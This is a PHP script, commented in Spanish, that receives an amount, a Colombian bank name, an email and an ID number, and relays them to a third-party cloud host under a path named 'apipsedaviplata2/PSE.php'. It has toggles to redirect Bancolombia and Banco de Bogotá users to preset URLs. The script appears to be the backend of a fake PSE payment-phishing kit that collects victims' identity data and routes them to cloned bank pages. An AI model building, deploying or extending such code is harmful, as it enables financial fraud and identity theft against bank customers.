<?php

error_reporting(0);
ini_set('display_errors', 0);
header('Content-Type: application/json');

// === Configuración de redirección directa por banco ===
$redireccion_bancolombia = false;  // true = activado, false = desactivado
$url_bancolombia = "";

$redireccion_bogota = true;  // true = activado, false = desactivado
$url_bogota = "";

// === Protección Antiflood / Anti-Spam / Anti-DDoS básica ===
$ip = $_SERVER['REMOTE_ADDR'];
$rate_limit_file = sys_get_temp_dir() . "/rate_limit_" . md5($ip) . ".txt";
$time_limit_seconds = 30;

if (file_exists($rate_limit_file)) {
    $last_access = file_get_contents($rate_limit_file);
    if (time() - $last_access < $time_limit_seconds) {
        echo json_encode(["Error" => "Demasiadas solicitudes. Intenta de nuevo en 30 segundos."], JSON_PRETTY_PRINT);
        exit;
    }
}
file_put_contents($rate_limit_file, time());

// Lista de bancos permitidos
$allowed_banks = [
    "ALIANZA FIDUCIARIA", "BAN100", "BANCAMIA S.A.", "BANCO AGRARIO", "BANCO AV VILLAS",
    "BANCO BBVA COLOMBIA S.A.", "BANCO CAJA SOCIAL", "BANCO COOPERATIVO COOPCENTRAL",
    "BANCO DE BOGOTA", "BANCO DE OCCIDENTE", "BANCO FALABELLA", "BANCO FINANDINA S.A. BIC",
    "BANCO GNB SUDAMERIS", "BANCO ITAU", "BANCO J.P. MORGAN COLOMBIA S.A.",
    "BANCO MUNDO MUJER S.A.", "BANCO PICHINCHA S.A.", "BANCO POPULAR",
    "BANCO SANTANDER COLOMBIA", "BANCO SERFINANZA", "BANCO UNION antes GIROS", "BANCOLOMBIA",
    "BANCOOMEVA S.A.", "BOLD CF", "CFA COOPERATIVA FINANCIERA", "CITIBANK", "COINK SA",
    "COLTEFINANCIERA", "CONFIAR COOPERATIVA FINANCIERA", "COTRAFA", "Crezcamos-MOSí", "DALE",
    "DING", "FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO", "GLOBAL66", "IRIS",
    "JFK COOPERATIVA FINANCIERA", "LULO BANK", "MOVII S.A.", "NEQUI", "NU", "POWWI",
    "RAPPIPAY", "SCOTIABANK COLPATRIA", "UALÁ"
];

// Leer el cuerpo JSON de la solicitud
$request_data = json_decode(file_get_contents('php://input'), true);

// Validar si la decodificación fue exitosa
if ($request_data === null) {
    echo json_encode(["Error" => "Solicitud JSON inválida"], JSON_PRETTY_PRINT);
    exit;
}

// Sanitizar entrada
$amount = isset($request_data['total']) ? filter_var($request_data['total'], FILTER_VALIDATE_INT) : null;
$bank = isset($request_data['bank']) ? filter_var($request_data['bank'], FILTER_SANITIZE_STRING) : null;
$correo = isset($request_data['email']) ? filter_var($request_data['email'], FILTER_SANITIZE_STRING) : null;
$documento = isset($request_data['identification']) ? filter_var($request_data['identification'], FILTER_SANITIZE_STRING) : null;

// Validaciones
if ($amount === false || $amount <= 2000) {
    echo json_encode(["Error" => "Monto inválido"], JSON_PRETTY_PRINT);
    exit;
}
if (!in_array($bank, $allowed_banks)) {
    echo json_encode(["Error" => "Banco no permitido"], JSON_PRETTY_PRINT);
    exit;
}

// === Redirección directa para Bancolombia y Banco de Bogotá ===
if ($redireccion_bancolombia && $bank === "BANCOLOMBIA") {
    echo json_encode(["URL" => $url_bancolombia], JSON_PRETTY_PRINT);
    exit;
}
if ($redireccion_bogota && $bank === "BANCO DE BOGOTA") {
    echo json_encode(["URL" => $url_bogota], JSON_PRETTY_PRINT);
    exit;
}

// Preparar datos para enviar
$url = "https://phpclusters-196676-0.cloudclusters.net/apipsedaviplata2/PSE.php";
$data = http_build_query([
    "Documento" => $documento,
    "Correo" => $correo,
    "Banco" => $bank,
    "Monto" => $amount
]);
$headers = [
    "Content-Type: application/x-www-form-urlencoded"
];

// Enviar POST con cURL
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Mostrar respuesta
if ($httpCode >= 200 && $httpCode < 300) {
    echo $response;
} else {
    echo json_encode(["Error" => "Fallo la conexión al servidor externo"], JSON_PRETTY_PRINT);
}
?>
